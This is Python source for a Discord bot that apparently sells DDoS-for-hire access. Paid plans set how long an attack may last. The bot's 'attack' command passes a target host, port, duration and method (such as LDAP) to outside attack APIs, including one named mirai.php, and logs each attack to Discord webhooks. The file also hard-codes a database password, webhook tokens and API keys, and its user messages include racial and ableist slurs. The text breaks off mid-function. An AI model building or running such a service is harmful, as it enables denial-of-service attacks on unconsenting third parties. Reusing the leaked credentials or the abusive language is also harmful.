# This source has been made and developed by Bermuda.
# If you manage to get this source, Well done.
# Don't skidrip it or either share it!
# @Bermuda.sh

import asyncio
import collections
import discord
from discord.ext import commands
import requests
from datetime import datetime
import subprocess
import time
import json
import datetime
import pymongo
import random
from discord import User
from discord.ext.commands import has_permissions
import string

client = pymongo.MongoClient("mongodb+srv://MongoDB:4ZXLEIoK1Pahr0ZU@cluster0.isip6.gcp.mongodb.net/buyers?retryWrites=true&w=majority", 27017)

global db
global PlanA
global PlanB
global PlanC
global PlanReseller
global wledA
global wledB
global wledC
global wledReseller
db = client['db']
PlanA = db['planA']
PlanB = db['planB']
PlanC = db['planC']
PlanReseller = db['planReseller']
global BlacklistedIps
global BlacklistColl
global keysa
keysa = db['planakeys']
global keysb
keysb = db['planbkeys']
global keysc
keysc = db['planckeys']
BlacklistedIps = []
topmethods = []
BlacklistColl = db['BlacklistedIps']
wledA = []
wledB = []
wledC = []
wledReseller = []
keya = []
keyb = []
keyc = []

k = BlacklistColl.find()
for i in k:
	BlacklistedIps.append(i['ip'])


o = keysa.find()
for i in o:
	keya.append(i['key'])

o = keysb.find()
for i in o:
	keyb.append(i['key'])

o = keysc.find()
for i in o:
	keyc.append(i['key'])


e = PlanA.find()
for i in e:
	wledA.append(i['id'])


b = PlanB.find()
for i in e:
    wledB.append(i['id'])


c = PlanC.find()
for i in c:
	wledC.append(i['id'])


r = PlanReseller.find()
for i in r:
	wledReseller.append(i['id'])

    
print(wledA)


start_time = time.time()

methodsA = ['LDAP']
methodsB = ['METHODSB']
methodsC = ['METHODSC']
methodslowerA = ['METHODSA2']
methodslowerB = ['METHODSB2']
methodslowerC = ['METHODSC2']
othermethods = ["NOTHING"]

ver = "4.0"

bot = commands.Bot(command_prefix="'")
bot.remove_command('help')
bot.remove_command('methods')
bot.remove_command('plans')

@bot.command()
async def add(self,plan,id):
	print(str(wledReseller))
	if str(self.author.id) in wledReseller:
		if plan.lower() == 'plana':
			PlanA.insert_one({'id': id})
			wledA.clear()
			wledB.clear()
			wledC.clear()
			wledReseller.clear()
			e = PlanA.find()
			for i in e:
				wledA.append(i['id'])


			b = PlanB.find()
			for i in b:
				wledB.append(i['id'])


			c = PlanC.find()
			for i in c:
				wledC.append(i['id'])


			r = PlanReseller.find()
			for i in r:
				wledReseller.append(i['id'])

			succesful = discord.Embed(title='Successfully added user with the id: '+id+' from the db.',color=discord.Colour(3066993))
			await self.send(embed=succesful)

			print(wledA)


		elif plan.lower() == 'planb':
			PlanB.insert_one({'id': id})
			wledA.clear()
			wledB.clear()
			wledC.clear()
			wledReseller.clear()
			e = PlanA.find()
			for i in e:
				wledA.append(i['id'])




			b = PlanB.find()
			for i in b:
				wledB.append(i['id'])


			c = PlanC.find()
			for i in c:
				wledC.append(i['id'])


			r = PlanReseller.find()
			for i in r:
				wledReseller.append(i['id'])

			succesful = discord.Embed(title='Successfully added user with the id: '+id+' to the db.',color=discord.Colour(3066993))
			await self.send(embed=succesful)

		elif plan.lower() == 'planc':
			PlanC.insert_one({'id': id})
			wledA.clear()
			wledB.clear()
			wledC.clear()
			wledReseller.clear()
			e = PlanA.find()
			for i in e:
				wledA.append(i['id'])




			b = PlanB.find()
			for i in b:
				wledB.append(i['id'])


			c = PlanC.find()
			for i in c:
				wledC.append(i['id'])


			r = PlanReseller.find()
			for i in r:
				wledReseller.append(i['id'])


			succesful = discord.Embed(title='Successfully added user with the id: '+id+' to the db.',color=discord.Colour(3066993))
			await self.send(embed=succesful)
	else:
		embed = discord.Embed(title='You do not have gentoken perms! (Reseller)')
		await self.send(embed=embed)

@bot.command()
@has_permissions(ban_members=True)
async def addreseller(self,id):
    PlanReseller.insert_one({'id': id})
    wledReseller.clear()
       
    r = PlanReseller.find()
    for i in r:
        wledReseller.append(i['id'])
                
    succesful = discord.Embed(title='Successfully added user with the id: '+id+' to the db.',color=discord.Colour(3066993))
    await self.send(embed=succesful)

@bot.command()
@has_permissions(ban_members=True)
async def remove(self,plan,id):
    if plan.lower() == 'plana':
        PlanA.delete_one({'id': id})
        wledA.clear()
        wledB.clear()
        wledC.clear()
        wledReseller.clear()
        e = PlanA.find()
        for i in e:
            wledA.append(i['id'])


        b = PlanB.find()
        for i in b:
            wledB.append(i['id'])


        c = PlanC.find()
        for i in c:
            wledC.append(i['id'])
            
        succesful = discord.Embed(title='Successfully removed user with the id: '+id+' from the db.',color=discord.Colour(3066993))
        await self.send(embed=succesful)
        
    elif plan.lower() == 'planb':
        PlanB.delete_one({'id': id})
        wledA.clear()
        wledB.clear()
        wledC.clear()
        wledReseller.clear()
        e = PlanA.find()
        for i in e:
            wledA.append(i['id'])


        b = PlanB.find()
        for i in b:
            wledB.append(i['id'])


        c = PlanC.find()
        for i in c:
            wledC.append(i['id'])
            
        print(wledA)
            
        succesful = discord.Embed(title='Successfully removed user with the id: '+id+' from the db.',color=discord.Colour(3066993))
        await self.send(embed=succesful)
            
    elif plan.lower() == 'planc':
        PlanC.delete_one({'id': id})
        wledA.clear()
        wledB.clear()
        wledC.clear()
        wledReseller.clear()
        e = PlanA.find()
        for i in e:
            wledA.append(i['id'])


        b = PlanB.find()
        for i in b:
            wledB.append(i['id'])


        c = PlanC.find()
        for i in c:
            wledC.append(i['id'])
            
        succesful = discord.Embed(title='Successfully removed user with the id: '+id+' from the db.',color=discord.Colour(3066993))
        await self.send(embed=succesful)

    elif plan.lower() == 'planreseller':
        PlanReseller.delete_one({'id': id})
        wledA.clear()
        wledB.clear()
        wledC.clear()
        wledReseller.clear()
        e = PlanA.find()
        for i in e:
            wledA.append(i['id'])


        b = PlanB.find()
        for i in b:
            wledB.append(i['id'])


        c = PlanC.find()
        for i in c:
            wledC.append(i['id'])

        r = PlanReseller.find()
        for i in r:
            wledReseller.append(i['id'])
            
        succesful = discord.Embed(title='Successfully removed user with the id: '+id+' from the db.',color=discord.Colour(3066993))
        await self.send(embed=succesful)

@bot.command()
async def help(self):
    	help = discord.Embed(title=f"▸ Help Menu", color=0x9700f5, description="Prefix '")
    	help.add_field(name="▸ Attacktut", value="Shows you how to send an attack", inline=False)
    	help.add_field(name="▸ Plans", value="Shows available plans", inline=False)
    	help.add_field(name="▸ Rules", value="Shows rules", inline=False)
    	help.add_field(name="▸ Attack Commands", value="[Prefix] + attack", inline=False)
    	help.add_field(name="▸ Tools", value="Shows tools", inline=False)
    	help.add_field(name="▸ Changelog", value="Shows recent changelog", inline=False)
    	help.add_field(name="▸ Misc", value="Shows misc", inline=False)
    	help.add_field(name="▸ Admin", value="Shows Administrator commands [For admins only]", inline=False)
    	help.add_field(name="▸ Secret image do not look....", value="http://alturl.com/p749b", inline=False)
    	await self.send(embed=help)

@bot.command()
async def plans(ctx):
    plan = discord.Embed(title="Available Plans", 
        color=0x9700f5)
    plan.add_field(name="Rookie", value="▸ €20 Lifetime Max 400 seconds + Access to limited methods", inline=False)
    plan.add_field(name="Soldier", value="▸ €30 Lifetime - Max 800 seconds + Access to limited methods", inline=False)
    plan.add_field(name="God", value="▸ €40 Lifetime - Max 1200 seconds + Access to all methods", inline=False)
    await ctx.send(embed=plan) 

@bot.command()
async def attacktut(ctx):
    plan = discord.Embed(title="Attack Tutorial", 
        color=0x9700f5)
    plan.add_field(name="Example", value="▸ 'attack 1.1.1.1 80 60 LDAP", inline=False)
    await ctx.send(embed=plan) 

@bot.command()
async def users(ctx):
    users = discord.Embed(title="User Count", 
        color=0x9700f5)
    amount = len(wledA) + len(wledB) + len(wledC)
    users.add_field(name="Users", value="▸ "+str(amount), inline=False)
    await ctx.send(embed=users) 

@bot.command()
async def misc(ctx):
    misc = discord.Embed(title="Misc", 
        color=0x9700f5)
    misc.add_field(name="Stats", value="▸ Shows the bot stats", inline=False)
    misc.add_field(name="Users", value="▸ Shows user count", inline=False)
    misc.add_field(name="Profile", value="▸ Shows your profile", inline=False)
    misc.add_field(name="Viewips", value="▸ Shows the amount of IP's Blacklisted", inline=False)
    misc.add_field(name="Blcheck", value="▸ Tells you if the IP is Blacklisted", inline=False)
    await ctx.send(embed=misc) 

@bot.command()
async def rules(ctx):
    rules = discord.Embed(title="Rules !!", 
        color=0x9700f5)
    rules.add_field(name="Hitting Government", value="▸ Is prohibited and you will be removed (or banned) from the bot", inline=False)
    rules.add_field(name="Hitting Dstats [IP'S Are Blacklisted]", value="▸ Is prohibited and you will be removed (or banned) from the bot", inline=False)
    rules.add_field(name="Disrespecting the Owner(s) or Admin(s)", value="▸ Is prohibited and you will be removed (or banned) from the bot", inline=False)
    rules.add_field(name="Ignoring the rules", value="▸ Is prohibited and you will be removed (or banned) from the bot", inline=False)
    rules.add_field(name="Trying to spam attacks", value="▸ Is prohibited and you will be removed (or banned) from the bot", inline=False)
    rules.add_field(name="Trashtalking", value="▸ Is prohibited and you will be removed (or banned) from the bot", inline=False)
    await ctx.send(embed=rules) 

@bot.command()
async def tools(ctx):
    tools = discord.Embed(title="Tools", 
        color=0x9700f5)
    tools.add_field(name="Portscan", value="▸ Portscan a IP Address", inline=False)
    tools.add_field(name="GeoIP", value="▸ Geolocation of IP", inline=False)
    tools.add_field(name="Ping", value="▸ Ping a IP Address", inline=False)
    tools.add_field(name="Nmap", value="▸ NMAP", inline=False)
    tools.add_field(name="Geninfo", value="▸ Random Person Info Generator", inline=False)
    tools.add_field(name="Checkweb", value="▸ Checks if a host is up or down", inline=False)
    tools.add_field(name="Ip2domain", value="▸ Attempts to find websites hosted on the specific IP address", inline=False)
    tools.add_field(name="Phonelookup", value="▸ Get more information about any phone number", inline=False)
    tools.add_field(name="Mac", value="▸ Search up mac address", inline=False)
    await ctx.send(embed=tools)

@bot.command()
async def changelog(ctx):
    changelog = discord.Embed(title="Changelog version 4.0", 
        color=0x9700f5)
    changelog.add_field(name="Added", value="▸ Profile", inline=False)
    changelog.add_field(name="Added", value="▸ New methods", inline=False)
    changelog.add_field(name="Added", value="▸ View how many IP's Blacklisted", inline=False)
    changelog.add_field(name="Added", value="▸ More shit", inline=False)
    changelog.add_field(name="Credits", value="▸ Bermuda <3", inline=False)
    await ctx.send(embed=changelog)  

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def attack(ctx, host, port, secs, method):
	if str(ctx.author.id) in wledA:
		if int(secs) <= 1200:
			if method in methodsA or method in methodslowerA:
				if host in BlacklistedIps:
					no = discord.Embed(title='The ip you want to attack is blacklisted nigger fuck off',color=discord.Colour(15158332))
					await ctx.send(embed=no)
					return
				else:
					if method in methodsA:
						print('higher')
						logger = {"content": "```-----------Bermuda Attack Logs-----------\nMember:\n"+str(ctx.author)+"\nHost:\n"+str(host)+"\nPort:\n"+str(port)+"\nMethod:\n"+str(method)+"```"}
						requests.post(url='https://discordapp.com/api/webhooks/752189710109114398/cMp_D4THKHtd3Jrh18sRTlSOtAALKUGH7FC1ic_vV_bRK5ryjETrqLzREIhxgEMl5_1n',data=logger)
						requests.get('http://ejapiservice.xyz/1.php?key=Bermuda-4e567&host='+host+'&port='+port+'&time='+secs+'&method='+method)
					if method in methodslowerA:
						print('lower')
						logger = {"content": "```-----------Bermuda Attack Logs-----------\nMember:\n"+str(ctx.author)+"\nHost:\n"+str(host)+"\nPort:\n"+str(port)+"\nMethod:\n"+str(method)+"```"}
						requests.post(url='https://discordapp.com/api/webhooks/752189856636993567/OvVSselKbO-vtgBv-OtaRqCdyZQy-xRwnQpP647xVXSEp_3iIWzAc3ZfvjENQNcW_mbd',data=logger)
						requests.get('https://illuminatiapi.cc/apis/vipPlus.php?key=ktyjghjmgjkiyu90-&host='+host+'&port='+port+'&time='+secs+'&method='+method)
					if method in othermethods:
						print('other')
						logger = {"content": "```-----------Bermuda Attack Logs-----------\nMember:\n"+str(ctx.author)+"\nHost:\n"+str(host)+"\nPort:\n"+str(port)+"\nMethod:\n"+str(method)+"```"}
						requests.post(url='https://discordapp.com/api/webhooks/752190104172494951/K81gJPiDnSXRKiMWkUPfSBqfb_N-pR3gq5H-kVTUr1J2ah1jKBZ6VnFh2NiquqfQ-XOB',data=logger)
						requests.get('http://51.89.25.74/mirai.php?key=eee&host='+host+'&port='+port+'&time='+secs+'&method='+method)
					sent = discord.Embed(title="Bermuda has sent an attack!", color=0x9700f5)
					sent.add_field(name="IP:", value=f"▸ {host}", inline=False)
					sent.add_field(name="Port:", value=f"▸ {port}", inline=False)
					sent.add_field(name="Seconds:", value=f"▸ {secs}", inline=False)
					sent.add_field(name="Method:", value=f"▸ {method}", inline=False)
					msg = await ctx.send(embed=sent)
					isec = int(secs)
					while isec > 0:
						isec -= 1
						after = discord.Embed(title="Bermuda has sent an attack!", color=0x9700f5)
						after.add_field(name="Host:", value=f"▸ {host}", inline=False)
						after.add_field(name="Port:", value=f"▸ {port}", inline=False)
						after.add_field(name="Seconds:", value=f"▸ {isec}", inline=False)
						after.add_field(name="Method:", value=f"▸ {method}", inline=False)
						await msg.edit(embed=after)
						time.sleep(1)
						if isec <= 1:
							done = discord.Embed(title="Bermuda has sent an attack!", color=0xe61010)
							done.add_field(name="IP:", value=f"▸ {host}", inline=False)
							done.add_field(name="Port:", value=f"▸ {port}", inline=False)
							done.add_field(name="Seconds:", value="▸ Finished", inline=False)
							done.add_field(name="Method:", value=f"▸ {method}", inline=False)
							await msg.edit(embed=done)
							break
			elif method not in methodsA or method not in methodslowerA:
				print('e')
				invalid_syntax = discord.Embed(title="Invalid Method.", color=0xe61010)
				await ctx.send(embed=invalid_syntax)
		elif int(secs) > 1200:
			invalid_syntax = discord.Embed(title="The time you provided exceeds the time limit within your plan.", color=0xe61010)
			await ctx.send(embed=invalid_syntax)
	elif str(ctx.author.id) in wledB:
		if int(secs) > 800:
			invalid_syntax = discord.Embed(title="The time you provided exceeds the time limit within your plan.", color=0xe61010)
			await ctx.send(embed=invalid_syntax)
		elif int(secs) <= 800:
			if method not in methodsB or method not in methodslowerB:
				invalid_syntax = discord.Embed(title="Invalid Method.", color=0xe61010)
				await self.send(embed=invalid_syntax)
			else:
				if host in BlacklistedIps:
					no = discord.Embed(title='The IP you want to attack is blacklisted retard fuck off',color=0xe61010)
					await ctx.send(embed=no)
					return
				else:
					if method in methodsB:
						print('higher')
						logger = {"content": "```-----------Bermuda Attack Logs-----------\nMember:\n"+str(ctx.author)+"\nHost:\n"+str(host)+"\nPort:\n"+str(port)+"\nMethod:\n"+str(method)+"```"}
						requests.post(url='https://discordapp.com/api/webhooks/752189710109114398/cMp_D4THKHtd3Jrh18sRTlSOtAALKUGH7FC1ic_vV_bRK5ryjETrqLzREIhxgEMl5_1n',data=logger)
						requests.get('http://ejapiservice.xyz/1.php?key=Bermuda-4e567&host='+host+'&port='+port+'&time='+secs+'&method='+method)
					if method in methodslowerB:
						print('lower')
						logger = {"content": "```-----------Bermuda Attack Logs-----------\nMember:\n"+str(ctx.author)+"\nHost:\n"+str(host)+"\nPort:\n"+str(port)+"\nMethod:\n"+str(method)+"```"}
						requests.post(url='https://discordapp.com/api/webhooks/752189856636993567/OvVSselKbO-vtgBv-OtaRqCdyZQy-xRwnQpP647xVXSEp_3iIWzAc3ZfvjENQNcW_mbd',data=logger)
						requests.get('http://ejapiservice.xyz/ejservice.php?key=HovBcDFqet&host='+host+'&port='+port+'&time='+secs+'&method='+method)
					if method in othermethods:
						print('other')
						logger = {"content": "```-----------Bermuda Attack Logs-----------\nMember:\n"+str(ctx.author)+"\nHost:\n"+str(host)+"\nPort:\n"+str(port)+"\nMethod:\n"+str(method)+"```"}
						requests.post(url='https://discordapp.com/api/webhooks/752190104172494951/K81gJPiDnSXRKiMWkUPfSBqfb_N-pR3gq5H-kVTUr1J2ah1jKBZ6VnFh2NiquqfQ-XOB',data=logger)
						requests.get('http://51.89.25.74/mirai.php?key=eee&host='+host+'&port='+port+'&time='+secs+'&method='+method)
					sent = discord.Embed(title="Bermuda has sent an attack!", color=0x9700f5)
					sent.add_field(name="IP:", value=f"▸ {host}", inline=False)
					sent.add_field(name="Port:", value=f"▸ {port}", inline=False)
					sent.add_field(name="Seconds:", value=f"▸ {secs}", inline=False)
					sent.add_field(name="Method:", value=f"▸ {method}", inline=False)
					msg = await ctx.send(embed=sent)
					isec = int(secs)
					while isec > 0:
						isec -= 1
						after = discord.Embed(title="Bermuda has sent an attack!", color=0x9700f5)
						after.add_field(name="Host:", value=f"▸ {host}", inline=False)
						after.add_field(name="Port:", value=f"▸ {port}", inline=False)
						after.add_field(name="Seconds:", value=f"▸ {isec}", inline=False)
						after.add_field(name="Method:", value=f"▸ {method}", inline=False)
						await msg.edit(embed=after)
						time.sleep(1)
						if isec <= 1:
							done = discord.Embed(title="Bermuda has sent an attack!", color=0xe61010)
							done.add_field(name="IP:", value=f"▸ {host}", inline=False)
							done.add_field(name="Port:", value=f"▸ {port}", inline=False)
							done.add_field(name="Seconds:", value="▸ Finished", inline=False)
							done.add_field(name="Method:", value=f"▸ {method}", inline=False)
							await msg.edit(embed=done)
							break
	elif str(ctx.author.id) in wledC:
		if int(secs) > 400:
			invalid_syntax = discord.Embed(title="The time you provided exceeds the time limit within your plan.", color=0xe61010)
			await ctx.send(embed=invalid_syntax)
		elif int(secs) <= 400:
			if method not in methodsC or method not in methodslowerC:
				invalid_syntax = discord.Embed(title="Invalid Method.", color=0xe61010)
				await self.send(embed=invalid_syntax)
			else:
				if host in BlacklistedIps:
					no = discord.Embed(title='The IP you want to attack is blacklisted retard fuck off',color=0xe61010)
					await ctx.send(embed=no)
					return
				else:
					if method in methodsC:
						print('higher')
						logger = {"content": "```-----------Bermuda Attack Logs-----------\nMember:\n"+str(ctx.author)+"\nHost:\n"+str(host)+"\nPort:\n"+str(port)+"\nMethod:\n"+str(method)+"```"}
						requests.post(url='https://discordapp.com/api/webhooks/752189710109114398/cMp_D4THKHtd3Jrh18sRTlSOtAALKUGH7FC1ic_vV_bRK5ryjETrqLzREIhxgEMl5_1n',data=logger)
						requests.get('http://ejapiservice.xyz/1.php?key=Bermuda-4e567&host='+host+'&port='+port+'&time='+secs+'&method='+method)
					if method in methodslowerC:
						print('lower')
						logger = {"content": "```-----------Bermuda Attack Logs-----------\nMember:\n"+str(ctx.author)+"\nHost:\n"+str(host)+"\nPort:\n"+str(port)+"\nMethod:\n"+str(method)+"```"}
						requests.post(url='https://discordapp.com/api/webhooks/752189856636993567/OvVSselKbO-vtgBv-OtaRqCdyZQy-xRwnQpP647xVXSEp_3iIWzAc3ZfvjENQNcW_mbd',data=logger)
						requests.get('http://ejapiservice.xyz/ejservice.php?key=HovBcDFqet&host='+host+'&port='+port+'&time='+secs+'&method='+method)
					if method in othermethods:
						print('other')
						logger = {"content": "```-----------Bermuda Attack Logs-----------\nMember:\n"+str(ctx.author)+"\nHost:\n"+str(host)+"\nPort:\n"+str(port)+"\nMethod:\n"+str(method)+"```"}
						requests.post(url='https://discordapp.com/api/webhooks/752190104172494951/K81gJPiDnSXRKiMWkUPfSBqfb_N-pR3gq5H-kVTUr1J2ah1jKBZ6VnFh2NiquqfQ-XOB',data=logger)
						requests.get('http://51.89.25.74/mirai.php?key=eee&host='+host+'&port='+port+'&time='+secs+'&method='+method)
					sent = discord.Embed(title="Bermuda has sent an attack!", color=0x9700f5)
					sent.add_field(name="IP:", value=f"▸ {host}", inline=False)
					sent.add_field(name="Port:", value=f"▸ {port}", inline=False)
					sent.add_field(name="Seconds:", value=f"▸ {secs}", inline=False)
					sent.add_field(name="Method:", value=f"▸ {method}", inline=False)
					msg = await ctx.send(embed=sent)
					isec = int(secs)
					while isec > 0:
						isec -= 1
						after = discord.Embed(title="Bermuda has sent an attack!", color=0x9700f5)
						after.add_field(name="Host:", value=f"▸ {host}", inline=False)
						after.add_field(name="Port:", value=f"▸ {port}", inline=False)
						after.add_field(name="Seconds:", value=f"▸ {isec}", inline=False)
						after.add_field(name="Method:", value=f"▸ {method}", inline=False)
						await msg.edit(embed=after)
						time.sleep(1)
						if isec <= 1:
							done = discord.Embed(title="Bermuda has sent an attack!", color=0xe61010)
							done.add_field(name="IP:", value=f"▸ {host}", inline=False)
							done.add_field(name="Port:", value=f"▸ {port}", inline=False)
							done.add_field(name="Seconds:", value="▸ Finished", inline=False)
							done.add_field(name="Method:", value=f"▸ {method}", inline=False)
							await msg.edit(embed=done)
							break

@bot.command()
@has_permissions(ban_members=True)
async def blacklistip(self,ip):
	BlacklistColl.insert_one({"ip": ip})
	BlacklistedIps.clear()
	k = BlacklistColl.find()
	for i in k:
		BlacklistedIps.append(i['ip'])
	succesful = discord.Embed(title='Succesfully blacklisted the ip: '+ip,color=discord.Colour(3066993))
	await self.send(embed=succesful)

@bot.command()
@has_permissions(ban_members=True)
async def unblacklistip(self,ip):
	BlacklistColl.delete_one({"ip": ip})
	BlacklistedIps.clear()
	k = BlacklistColl.find()
	for i in k:
		BlacklistedIps.append(i['ip'])
	succesful = discord.Embed(title='Succesfully unblacklisted the ip: '+ip,color=discord.Colour(3066993))
	await self.send(embed=succesful)
    
@bot.command()
async def portscan(self,ip):
    portsjsonified=requests.get('https://api.c99.nl/portscanner?key=luis43fw.politofr21f97@gmail.com&host='+ip+'&json')
    ports=json.loads(portsjsonified.text)
    embed = discord.Embed(title='Bermuda PortScanner',color=0x9700f5)
    embed.add_field(name='Open Ports',value=ports['port'].replace(',','\n'))
    await self.send(embed=embed)
    
@bot.command()
async def ping(self,ip):
    upordown=requests.get('https://api.c99.nl/ping?key=luis43fw.politofr21f97@gmail.com&host='+ip+'&json')
    resalts = json.loads(upordown.text)

    embed = discord.Embed(title='Bermuda Pinger',color=0x9700f5)
    embed.add_field(name='Result',value='Is up: '+'**'+str(resalts['success'])+'**')
    embed.add_field(name='Stats:',value=resalts['result'].replace('<br>','\n'),inline=False)
    await self.send(embed=embed)

@bot.command()
async def geoip(self,ip):
    geoip = requests.get('https://api.c99.nl/geoip?key=luis43fw.politofr21f97@gmail.com&host='+ip)
    embed=discord.Embed(title='Bermuda GeoIP:', color=0x9700f5)
    embed.add_field(name='Geolocation information:',value=geoip.text.replace('<br>','\n'))
    await self.send(embed=embed)
 
@bot.command()
async def mac(ctx, mac): # b'\xfc'
    r = requests.get('http://api.macvendors.com/' + mac)
    mac = discord.Embed(title='MAC Lookup Result', description=r.text, colour=0x9700f5)
    mac.set_author(name='', icon_url='')
    await ctx.send(embed=mac)

@bot.command()
async def nmap(self,ip):
    nmap = requests.get('https://api.c99.nl/nmap?key=luis43fw.politofr21f97@gmail.com&host='+ip)
    embed=discord.Embed(title='Bermuda NMAP:', color=0x9700f5)
    embed.add_field(name='NMAP Results:',value=nmap.text.replace('<br>','\n'))
    await self.send(embed=embed)

@bot.command()
async def geninfo(self,gender):
    geninfo = requests.get('https://api.c99.nl/randomperson?key=luis43fw.politofr21f97@gmail.com&gender='+gender)
    embed=discord.Embed(title='Bermuda Info Generator:', color=0x9700f5)
    embed.add_field(name='Generator Results:',value=geninfo.text.replace('<br>','\n'))
    await self.send(embed=embed)

@bot.command()
async def checkweb(self,website):
    checkweb = requests.get('https://api.c99.nl/upordown?key=luis43fw.politofr21f97@gmail.com&host='+website)
    embed=discord.Embed(title='Bermuda Website Checker:', color=0x9700f5)
    embed.add_field(name='Checker Results:',value=checkweb.text.replace('<br>','\n'))
    await self.send(embed=embed)

@bot.command()
async def ip2domain(self,domain):
    ip2domain = requests.get('https://api.c99.nl/ip2domains?key=luis43fw.politofr21f97@gmail.com&ip='+domain)
    embed=discord.Embed(title='Bermuda Website Checker:', color=0x9700f5)
    embed.add_field(name='Checker Results:',value=ip2domain.text.replace('<br>','\n'))
    await self.send(embed=embed)
 
@bot.command()
async def phonelookup(self,number):
    phonelookup = requests.get('https://api.c99.nl/phonelookup?key=luis43fw.politofr21f97@gmail.com&number='+number)
    embed=discord.Embed(title='Bermuda Phone Lookup:', color=0x9700f5)
    embed.add_field(name='Lookup Results:',value=phonelookup.text.replace('<br>','\n'))
    await self.send(embed=embed)

@bot.command(pass_context = True)
async def stats(ctx):
	second = time.time() - start_time
	minute, second = divmod(second, 60)
	hour, minute = divmod(minute, 60)
	day, hour = divmod(hour, 24)
	week, day = divmod(day, 7)
	embed = discord.Embed(color = 0x9700f5)
	embed.add_field(name="Version", value=ver, inline=False)
	embed.add_field(name="Weeks", value=" %d"% (week), inline=False)
	embed.add_field(name="Days", value=" %d"% (day), inline=False)
	embed.add_field(name="Hours", value=" %d"% (hour), inline=False)
	embed.add_field(name="Minutes", value=" %d"% (minute), inline=False)
	embed.set_footer(text="Discord Bot Developed By Bermuda <3")
	await ctx.send(embed=embed)

@bot.command()
@has_permissions(ban_members=True)
async def gentoken(self,plan):
	if plan.lower() == 'plana':
		thing = 'BERMUDAKEY|' + ''.join(random.choice(string.ascii_letters + string.digits + string.ascii_uppercase) for i in range(35))
		keysa.insert_one({"key": str(thing)})
		o = keysa.find()
		keyc.clear()
		for i in o:
			keya.append(i['key'])
		embed = discord.Embed(title='Bermuda key gen', color=0x9700f5, description=str(thing))
		embed.set_footer(text='Please note there are no spaces or new lines and BERMUDAKEY| Is included in the key')
		await self.author.send(embed=embed)
	elif plan.lower() == 'planb':
		thing = 'BERMUDAKEY|' + ''.join(random.choice(string.ascii_letters + string.digits + string.ascii_uppercase) for i in range(30))
		keysb.insert_one({"key": str(thing)})
		o = keysb.find()
		keyc.clear()
		for i in o:
			keyb.append(i['key'])
		
		embed = discord.Embed(title='Bermuda key gen', color=0x9700f5, description=str(thing))
		embed.set_footer(text='Please note there are no spaces or new lines and BERMUDAKEY| Is included in the key')
		await self.author.send(embed=embed)
	elif plan.lower() == 'planc':
		thing = 'BERMUDAKEY|' + ''.join(random.choice(string.ascii_letters + string.digits + string.ascii_uppercase) for i in range(30))
		keysc.insert_one({"key": str(thing)})
		o = keysc.find()
		keyc.clear()
		for i in o:
			keyc.append(i['key'])
		embed = discord.Embed(title='Bermuda key gen', color=0x9700f5, description=str(thing))
		embed.set_footer(text='Please note there are no spaces or new lines and BERMUDAKEY| Is included in the key')
		await self.author.send(embed=embed)
	elif plan.lower() != 'plana' or 'planb' or 'planc':
		embed = discord.Embed(title='Invalid Plan Selected', color=0x9700f5)
		await self.send(embed=embed)

@bot.command()
async def redeem(self,key):
	if isinstance(self.channel, discord.channel.DMChannel):
		if key in keya:
			keysa.delete_one({"key": str(key)})
			o = keysa.find()
			keya.clear()
			for i in o:
				keya.append(i['key'])
			PlanA.insert_one({"id": str(self.author.id)})
			wledA.clear()
			e = PlanA.find()
			for i in e:
				wledA.append(i['id'])
			embed = discord.Embed(title='Token successfully redeemed(PlanA), welcome', color=0x9700f5)
			await self.author.send(embed=embed)
			dataA = {"content": "```\nMember Who Redeemed:\n"+str(self.author)+"\nDate and time redeemed:\n"+str(datetime.datetime.now())+"\n```"}
			requests.post('https://discordapp.com/api/webhooks/752659248508305488/JnMq-sBIN3IMgDpzgT-KnpFDLEBdQs8AO9sD-_3STGk_ijmyqeKrop3kYSV6lb4ry8Sy',dataA)
		elif key in keyb:
			keysb.delete_one({"key": str(key)})
			o = keysb.find()
			keyb.clear()
			for i in o:
				keyb.append(i['key'])
			PlanB.insert_one({"id": str(self.author.id)})
			wledB.clear()
			e = PlanB.find()
			for i in e:
				wledB.append(i['id'])
			embed = discord.Embed(title='Token successfully redeemed(PlanB), welcome', color=0x9700f5)
			await self.author.send(embed=embed)
			dataB = {"content": "```\nMember Who Redeemed:\n"+str(self.author)+"\nDate and time redeemed:\n"+str(datetime.datetime.now())+"\n```"}
			requests.post('https://discordapp.com/api/webhooks/752661313431535627/mNFqteYMDPAoBrEmdiE9vS5h3P9LDZNT0fgjm-ZHPHKBsrHIK7U8QJZ6UIL8yGdqYBDF',dataB)
		elif key in keyc:
			keysc.delete_one({"key": str(key)})
			o = keysc.find()
			keyc.clear()
			for i in o:
				keyc.append(i['key'])
			PlanC.insert_one({"id": str(self.author.id)})
			wledC.clear()
			e = PlanC.find()
			for i in e:
				wledC.append(i['id'])
			embed = discord.Embed(title='Token successfully redeemed(PlanC), welcome', color=0x9700f5)
			await self.author.send(embed=embed)
			dataC = {"content": "```\nMember Who Redeemed:\n"+str(self.author)+"\nDate and time redeemed:\n"+str(datetime.datetime.now())+"\n```"}
			requests.post('https://discordapp.com/api/webhooks/752662269980180521/YDzSGJiwSEzz3BBMbQ8NCpxo_ZnyLicpEI0GVr5X32guWAIBEoCHnksXliAvSEgI8JUt',dataC)
		elif key not in keya or keyb or keyc:
			embed = discord.Embed(title='Token does not exist in the database', color=0x9700f5)
			await self.send(embed=embed)
	

	else:
		embed = discord.Embed(title='Use my dms for this command', color=0x9700f5)
		await self.send(embed=embed)

@attack.error
async def attack_error(self,error):
    embed = discord.Embed(title='Cooldown',description = 'You are on cooldown try again in: '+str(round(error.retry_after))+' secs', color=0x9700f5)
    await self.send(embed=embed)

@bot.command()
@has_permissions(ban_members=True)
async def admin(ctx):
    admin = discord.Embed(title="Administrator Commands", 
        color=0x9700f5)
    admin.add_field(name="Add User to DB", value="▸ add [Discord ID] [plana], [planb], [planc]", inline=False)
    admin.add_field(name="Remove User from DB", value="▸ remove [Discord ID]", inline=False)
    admin.add_field(name="Generate Token", value="▸ gentoken [plana], [planb], [planc]", inline=False)
    admin.add_field(name="Check Key", value="▸ keycheckA, keycheckB, keycheckC + [KEY]", inline=False)
    admin.add_field(name="Blacklist IP", value="▸ blacklistip [IP]", inline=False)
    admin.add_field(name="Unblacklist IP", value="▸ unblacklistip [IP]", inline=False)
    admin.add_field(name="Mass Generate keys", value="▸ massgentoken plana, planb, planc, [amount]", inline=False)
    await ctx.send(embed=admin)

@bot.command()
@has_permissions(ban_members=True)
async def massgentoken(self,plan,amount):
	if plan.lower() == 'plana':
		e = int(amount)
		b = 0
		await self.author.send('------------PLANA MASS TOKEN GEN------------')
		while b <= e:
			b = b + 1
